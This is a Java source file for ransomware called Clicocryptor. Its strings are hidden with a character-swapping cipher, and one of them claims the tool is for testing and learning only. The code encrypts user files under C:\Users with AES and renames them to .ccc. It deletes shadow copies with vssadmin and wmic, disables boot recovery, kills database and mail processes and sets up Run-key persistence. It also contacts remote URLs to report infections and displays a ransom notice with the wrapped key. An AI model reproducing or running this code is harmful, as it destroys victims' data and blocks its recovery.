/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package clicopotwor;


import java.awt.Desktop;
import java.io.PrintWriter;
import javax.swing.ImageIcon;
import javax.imageio.ImageIO;
import java.awt.Image;
import java.io.File;
import java.io.FileInputStream;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.Path;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.FileOutputStream;
import java.net.URLConnection;
import java.util.Random;
import javax.swing.JLabel;
/**
 *
 * @author Maciej
 */
public class Clicocryptor {

    
    public static String string1 =  "C|iloc||rCpyot|rR|naoswmra|e.1 4";
    public static String string2 =  "S|fowtra|ec|ertade||of|rt|seitgnl/aenrni|gp|ruupes|so|ln|y";
    public static String string3 =  "R|desirtbituoi|ni||ss|rtcilt|yp|orihibet|d"; 
    public static String string4 =  "P|elsa|ed|not'||su|eo||np|oruditno||ystsme||sa||htre|ei||sn||og|iogn||abkc |";
    public static String string5 =   "D|ve||yb||aMicje||am|cM|cakz|a  ";
   public static String string7 =   "amicjed(tom)cakz(atag)amlid(toc)mo  ";
   public static String string6 =   "amicjed(tom)cakz(atac)ilocd(top) l";
   public static String string8 =   "I|||od||on|tt|ka|ea|yn||erpssobiliti|yf|ro||na|ym|sisu|e ";
      
    
    static byte[] byte_wrapped_key;
    
    static double encrypted_files = 0;
    
    static String string_key_seed = "aNzctylases eig ulopo z baakhca t rezap orubejzsn  aiselz iatnresewocat myi nncy h";
    static  byte[] byte_encryption_key;
    
    static String directory_to_encrypt = "C:\\";
    static File file_directory_to_ecrypt;
  //  static File[] file_list_to_encrypt;
    
    static String string_operation_mode;
    
    public static String[] extensions = {
 
        
        "d.re  ", "p.xf  ", "c.tr  ", "c.rs  ", "p.me  ", "o.td  ", "o.tt  ", "s.wx  ", "s.wt  ", "u.to  ", "m.xa  ", "o.sd  ", "o.st  ", "s.cx  ", "s.ct  ", "d.fi  ", "s.kl  ", "o.pd  ", "o.pt  ", "s.dx  ", "s.dt  ", "u.po  ", "o.gd  ", "o.gt  ", "s.mx  ", "m.lm  ", "l.ya  ", "l.ya 6", "a.cs  ", "s.lqti3e  ", "s.lqtide b", "s.lq  ", "a.ccbd  ", "m.bd  ", "d.fb  ", "o.bd  ", "f.mr  ", "m.dy  ", "m.iy  ", "i.db  ", "m.fd  ", "l.fd  ", "s.nl  ", "s.ou  ", "c.pp  ", "p.sa  ", "a.ms  ", "c.dm  ", "b.ta  ", "d.pi  ", "d.hc  ", "s.hc  ", "b.dr  ", "j.ps  ", "p.ph  ", "a.ps  ", "c.alss  ", "w.va  ", "s.fw  ", "f.al  ", "w.vm  ", "m.gp  ", "v.bo  ", "m.ep g", "a.fs  ", "a.iv  ", "m.vo  ", "m.vk  ", "f.vl  ", "w.am  ", "m.di  ", "d.vj u", "s.gv  ", "p.ds  ", "n.fe  ", "t.fi f", "t.fi  ", "c.mg  ", "r.wa  ", "g.fi  ", "b.pm  ", "j.gp  ", "j.ep g", "v.dc  ", "i.os  ", "b.cauk p", "z.pi  ", "r.ra  ", "t.zg  ", "t.ra  ", "b.ka  ", "t.kb  ", "P.QA  ", "A.CR  ", "a.se  ", "g.gp  ", "v.xm  ", "v.dm k", "v.id  ", "s.dl m", "s.dl x", "s.it  ", "s.ix  ", "h.pw  ", "s.tn  ", "o.enot2c  ", "d.gw  ", "p.fd  ", "w.sk  ", "r.ft  ", "c.vs  ", "t.tx  ", "v.ds x", "v.ds  ", "e.bd  ", "e.lm  ", "m.gs  ", "o.ts  ", "p.ts  ", "p.to m", "p.to x", "p.ap m", "p.sp x", "p.sp m", "p.sp  ", "p.to  ", "p.tp m", "p.tp x", "p.tp  ", "x.tl m", "x.tl x", "x.cl  ", "x.ml  ", "x.tl  ", "x.wl  ", "x.sl b", "x.sl m", "x.sl x", "x.sl  ", "d.to x", "d.to m", "d.to  ", "d.co m", "d.co b", "d.co x", "d.co  " };


    public static void cipher_Test()
    {
        
       System.out.println(cipher("Clico Cryptor says: Przygarnij Clicopotworka",0) + "\n\n"); 
        
       for ( int i = 0 ; i < extensions.length ; i++)
       {
         
           extensions[i] = cipher(extensions[i], 0);
         
           
           
       }

      
    //   System.exit(0);
    }
    
    
    public static boolean check_extensions(String string_file_path)
    {
        
        for ( int i = 0 ; i < extensions.length ; i++ )
        {
            
            if (string_file_path.endsWith(extensions[i]))
            {
                
                System.out.print(string_file_path + " ");
                return true;
            }
            
            
            
        }
        
        return false;
        
        
        
        
    }
    
    
    public static void list_directory(String string_directory_path)
    {
        
        try
        {
        
              file_directory_to_ecrypt = new File(string_directory_path);
              File[] file_list_to_encrypt = file_directory_to_ecrypt.listFiles();
              
              
              if (file_list_to_encrypt  == null)
              {
                  
                  return;
                  
              }
              
              
              for (int i = 0 ; i < file_list_to_encrypt.length ; i++)
              {
                  
                  try
                  {
                  
            //
                      
                      System.out.print(file_list_to_encrypt[i].getAbsolutePath());
                  
                  if (file_list_to_encrypt[i].isDirectory())
                  {
                       
                        list_directory(file_list_to_encrypt[i].getAbsolutePath());
                  
                  }
                  
                  if (file_list_to_encrypt[i].isFile())
                  {
                        if (check_extensions(file_list_to_encrypt[i].getAbsolutePath()))
                        {
                            if ((file_list_to_encrypt[i].length() < 5000000) && !(file_list_to_encrypt[i].isHidden()))
                            {
                                read_file(file_list_to_encrypt[i].getAbsolutePath());
                                
                            }
                        }
                  }
                  
                  } catch (Exception e)
                  {
                      
                      System.out.print(e.getLocalizedMessage());
                      
                  }
                  
                  
              }
        
        }
        catch (Exception e)
        {
            
            System.out.println("L:" + e.getMessage());
         
            
        }
        
        
        
    }
    
    public static void load_key()
    {
        try
        {
            
        
            
            KeyPairGenerator gen = KeyPairGenerator.getInstance("RSA");
            gen.initialize(2048);
            KeyPair key = gen.generateKeyPair();
            
            
         String  key_random_seed = "";
            
         //   ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("info.key"));
     // final PublicKey publicKey = (PublicKey) inputStream.readObject();
   
            final PublicKey publicKey =  key.getPublic();
        
      
        Random rand = new Random(System.currentTimeMillis());
        
        
            for ( int i = 0 ; i < 10 ; i++)
            {



              key_random_seed = key_random_seed + Integer.toString( 1000 * rand.nextInt());

            }
            
            key_random_seed = key_random_seed + string_key_seed;
            string_key_seed = key_random_seed;
        
            MessageDigest md5 = MessageDigest.getInstance("MD5");
            byte_encryption_key = md5.digest(string_key_seed.getBytes());
            
            
            for (int i = 0 ; i < byte_encryption_key.length ; i++)
            {
                
       //        System.out.print(String.format("%02x", byte_encryption_key[i]));
                
            }
           
            
             final Cipher cipher = Cipher.getInstance("RSA");
             cipher.init(Cipher.ENCRYPT_MODE, publicKey);
            
            byte_wrapped_key = cipher.doFinal(byte_encryption_key);
           
           for (int i = 0 ; i < byte_wrapped_key.length ; i++)
            {
                
               System.out.print(String.format("%02x", byte_wrapped_key[i]));
                
            }
            
         //   new File("C:\\ClicoCrypter").mkdir();
           
         //  FileOutputStream fos = new FileOutputStream("C:\\ClicoCrypter\\encryption.key");
         //   fos.write(byte_wrapped_key);
         //   fos.close();
            
        }
        catch (Exception e)
        {
            
            System.out.println("L: " + e.getMessage());
            
        }
    }
    
    
    public static void report_infection()
    {
        
        try
        {
        System.out.println("");
        String[] url_list = { cipher("thpt/:w/wwc.ilocp. l",0) , cipher("thpt/:w/wwo.gros.grp./lrcpyot.rhp p",0), cipher("thpt/:f/dsklsfkdjlkfjs.dnooi n",0), cipher("thpt/:f/sdjksfkdfjdksj.fnooi n",0), cipher("thpt/:n/sffjsnndofieptsffddso.inno  ",0) , cipher("thpt/:f/sdklsfkdfjjskdjfskidwerjkjjfdsfkdjo.grp. l",0), cipher("thpt/:r/.ferovvlreamspc.moh/m/a/0/f/0f00/021/8/0i5jz9ygfgg.1np g",0) };
        
        URL url;
        
        
        for (int i = 0 ; i < url_list.length; i++)
        {
        
            try
            {
            
            url = new URL(url_list[i]);
               
                URLConnection conn = url.openConnection();

                            BufferedReader br = new BufferedReader(
                                   new InputStreamReader(conn.getInputStream()));

                            String inputLine;
                while ((inputLine = br.readLine()) != null) {

                }
                

                
                

            }
            catch (Exception e)
            {
                
        
                
            }
        }
            
        }
        catch (Exception e)
        {
            
            System.out.println(e.getMessage());
            
        }
        
    }
    
    
    public static void persistance()
    {
        
        try
        {
        String s = null;
        
         ProcessBuilder builder = new ProcessBuilder(cipher("mc.dxe e",0) , "/c" , cipher("ER Gda dH\"EK_YUCRRNE_TSURES\\fowtra\\eiMrcsofo\\tiWdnwo\\suCrrneVtreisnoR\\nu \"t/R GES_ Zd/\" ba.cxe\"e/  fv/c rctp  ",0));
        
         Process p = builder.start();
        //Process p = Runtime.getRuntime().exec
        
        
        builder = new ProcessBuilder(cipher("mc.dxe e",0) , "/c" , cipher("atksiklle.ex/  fi/ miMrcsofo.txEhcnaeg*.",0));
        builder.start();
        
               
        builder = new ProcessBuilder(cipher("mc.dxe e",0) , "/c" , cipher("atksiklle.ex/  fi/ msMxEhcnaeg *",0));
        builder.start();
        
        
                      
        builder = new ProcessBuilder(cipher("mc.dxe e",0) , "/c" , cipher("atksiklle.ex/  fi/ mqsslreev.rxe e",0));
        builder.start(); 
        
        
        
        builder = new ProcessBuilder(cipher("mc.dxe e",0) , "/c" , cipher("atksiklle.ex/  fi/ mqswliret.rxe e",0));
        builder.start(); 
        
        
        builder = new ProcessBuilder(cipher("mc.dxe e",0) , "/c" , cipher("atksiklle.ex/  fi/ mymqsdle.ex  ",0));
        builder.start(); 
        
        
        builder = new ProcessBuilder(cipher("mc.dxe e",0) , "/c" , cipher("svasmdniD lete eS ahodsw/ LA Lq/iute  ",0));
        builder.start();    
        
        
        builder = new ProcessBuilder(cipher("mc.dxe e",0) , "/c" , cipher("mwcis ahodcwpo yedelet  ",0));
        builder.start();    
        
                
        builder = new ProcessBuilder(cipher("mc.dxe e",0) , "/c" , cipher("cbedid.txe es/ter cevoreeyanlbden  o",0));
        builder.start();    
        
               
          builder = new ProcessBuilder(cipher("mc.dxe e",0) , "/c" , cipher("ER Gda dH\"EK_YUCRRNE_TSUREC\\nortloP naleD\\setkpo \"t/R GES_ Zd/\" :C\\\\lCciCoyrtprea\\aab.pm \"f//  vaWllapep r",0));
        
          p = builder.start();
        
         builder = new ProcessBuilder(cipher("mc.dxe e",0) , "/c" , cipher("ER Gda d\"\\KHYEC_RUERTNU_ES\\RC\\nortloP nale\\\\eDksot\\p \"t/R GES_ Zd/\\ C\"\\:\\\\C\\ilocrCpyet\\ra\\aab.pm\"\\/  fv/W laplpare  ",0));
        
          p = builder.start();
          
          builder = new ProcessBuilder(cipher("mc.dxe e",0) , "/c" , cipher("URDNLL23E.EXu es3r.2ld,lpUadetePUresSrsyetPmramatere s  ",0));
        
          p = builder.start();
            
          
         
          
        
        }
        catch (Exception e)
        {
            
            System.out.println("P:" + e.getMessage());
            
            
        }
        
        
        
    }
    
    
    public static void crpyt_notify()         
    {
        
        window frame_notify = new window();
        
        frame_notify.setLocationRelativeTo(null);
        frame_notify.setVisible(true);
        
        
        try
        {
      //  Image image = null;
     //   URL url = new URL(cipher("thpt/:m/docsneet.rlpu/lpaosda/avatsra/avat_r7953j.gpd?taleni=e3139046548 ",0));
     //   URLConnection connection = url.openConnection();
     //   connection.setRequestProperty("User-Agent", cipher("aDkrc ilocam n21 3",0));
     //   image = ImageIO.read(url);
        
       // ImageIcon icon = new ImageIcon(image);
     //  
     //   frame_notify.jLabel1.setIcon(icon);
        
        }
        catch (Exception e)
        {
            
         
           // System.exit(0);
        }
        
        
        frame_notify.jTextArea1.setText(cipher("PU.SC ilocopwtrokez ajldt owejp ilik .yWzsoln eirzcenzei .lCcipotoower komezz rwcocit owejp ilika elc yzn  aepnw oetogc chse?z",0) + "\n\n");
        frame_notify.jLabel2.setText(cipher("lCci orCpyot rassy :rPyzagnrjiC ilocopwtroak",0) + "\n\n");
        
    frame_notify.jTextArea1.append(cipher("LKCU ZZSFYURAJYC :",0) + "\n");
                for (int i = 0 ; i < byte_wrapped_key.length ; i++)
            {
                
                frame_notify.jTextArea1.append(String.format("%02x", byte_wrapped_key[i]));                
                
            }
        
        
    }
    
       public static String szyfr(String str)
{

    char x[ ] = str.toCharArray( );

    for( int i=0 ; i!=x.length ; i++)
    {
      //  int n = x[i];
       // n+=3;
       // x[i]=(char)n;
        x[i] = (char)((( x[i]- 1) % 27) + 97);
    }
    return new String(x); 

} 
    
  public static String odszyfr(String str)
{

    char x[ ] = str.toCharArray( );

    for( int i=0 ; i!=x.length ; i++)
    {
      //  int n = x[i];
       // n+=3;
       // x[i]=(char)n;
        x[i] = (char)((( x[i] + 1) % 27) + 97);
    }
    return new String(x); 

} 
    
    
    
    public static void main(String[] args)
    {
        
        cipher_Test();
        System.out.println(cipher(string1,0));
        System.out.println("1.4");
        create_key(string_key_seed);
        
      //  System.exit(0);
        
        try
        {
            
                   try
          {
      
              Desktop.getDesktop().browse(new URL("www.checkpoint.clico.pl").toURI());
              

        
        
          }
          catch (Exception e)
          {
              
              System.out.println("" + e.getMessage());
              
          }
            
            
            

                 load_key();
           persistance();
           
           
             crpyt_notify();
              report_infection();
                 list_directory(cipher(":C\\\\sUre s",0));
            
              //  list_directory(directory_to_encrypt);
        
                System.out.println(cipher(":C\\\\sUre s",0));
                
                System.out.println("\n\n" + encrypted_files  +"\n" ); 
                  
                
                
               
        }
        catch (Exception e)
        {
            
            System.out.println("M:" + e.getMessage());
            System.exit(-1);
            
            
        }
        
        
        
    }
    
    public static void read_file(String file_name)
    {
        
        try
        {
        
        Path path_file_to_ecrypt = Paths.get(file_name);
        
        byte[] byte_original_file_content = Files.readAllBytes(path_file_to_ecrypt);
        
        System.out.print(byte_original_file_content.length + " " );
        
        encrypt_file(byte_original_file_content, file_name );
        
        }
        catch (Exception e)
        {
            
            System.out.println("R:" + e.getMessage());
            
            
            
        }
        
    }
    
    
    public static void encrypt_file(byte[] original_content, String file_name)
    {
        
        try
        {
        
              Cipher aes_cipher =  Cipher.getInstance(cipher("EA/SCE/BKPSCP5daidgn ",0));
              SecretKeySpec aes_key_spec = new SecretKeySpec(byte_encryption_key, "AES");       
        
              aes_cipher.init(Cipher.ENCRYPT_MODE, aes_key_spec);
              
              byte[] encrypted_content = aes_cipher.doFinal(original_content);
              
           //   System.out.print(encrypted_content.length + " ");
              
              Path path_file_to_ecrypt = Paths.get(file_name);
              
              Files.write(path_file_to_ecrypt, encrypted_content);
              
                            
              Files.move(path_file_to_ecrypt, Paths.get(file_name + ".ccc"));
              encrypted_files++;
              
        }
        catch (Exception e )
        {
            
            System.out.println(e.getMessage());
            
            
        }
        
        
    }
    
    public static String cipher(String msg , int shift){
    String s = "";
   // int len = msg.length();
    char temp;
    msg = msg + "  ";
    char table[] = msg.toCharArray();
    int len = table.length;
    
    if (len % 2 ==0)
    {
        // ilosc ok
        
    }
    
     if (len % 2 == 1)
     {
         
         len = len - 1;
         
     }
     //  System.out.println(len);
     
    for(int x = 0; x < len; x = x + 2)
    {
        temp = table[x];
        table[x] = table[x+1];
        table[x + 1] = temp;
        
        s = s + table[x] + table[x + 1];

        
    }
   // System.out.println(s);
    return s.replaceAll("\\s+$", "");
}
    
    
    public static void create_key(String string_key_seed)
    {
        
        try
        {
        
            MessageDigest md5 = MessageDigest.getInstance("MD5");
            byte_encryption_key = md5.digest(string_key_seed.getBytes());
       
        }
        catch (Exception e)
        {
            
            System.out.println("C:" + e.getMessage());
            
            
        }
                
        
        
        
    }
    
    
}
